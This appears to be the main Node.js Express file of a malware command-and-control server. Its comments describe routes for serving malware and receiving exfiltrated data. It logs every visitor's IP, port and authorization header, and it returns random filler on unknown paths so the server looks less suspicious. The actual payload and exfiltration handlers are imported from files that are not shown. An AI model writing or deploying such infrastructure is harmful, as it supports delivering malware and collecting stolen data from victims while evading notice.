const express = require("express");
const server = express();

const logging = require("./logging.js");
const util = require("./util.js");
const malwareReqs = require("./get_req.js");
const malwareData = require("./post_req.js");

// Log incoming traffic info
server.all("*", (request, response, next) => {
    logging.log("");
    logging.log(`Connection established with ${request.ip} via port ${request.socket.remotePort}.`);
    logging.log(`Request Type: ${request.method}`);
    logging.log(`Request Host: ${request.headers.host}`)
    logging.log(`Auth Key: ${request.headers.authorization}`)

    // logging.log(`Request Cookies: ${request.headers.cookie}`)
    // logging.log(`Request Location: ${request.headers.location}`)
    // logging.log(`Request Auth: ${request.headers.authorization}`)

    next();
});

// Handle fetching malware and data exfiltration
server.use(malwareReqs);
server.use(malwareData);

// Handle all invalid paths. Generate some random numbers to make it look less sus
server.all("*", (request, response) => {
    response.send(util.genAsciiStr(64));
});

const PORT = 80;
server.listen(PORT, () => {
    logging.log(`✅ Server launched on port ${PORT}.`, true);
});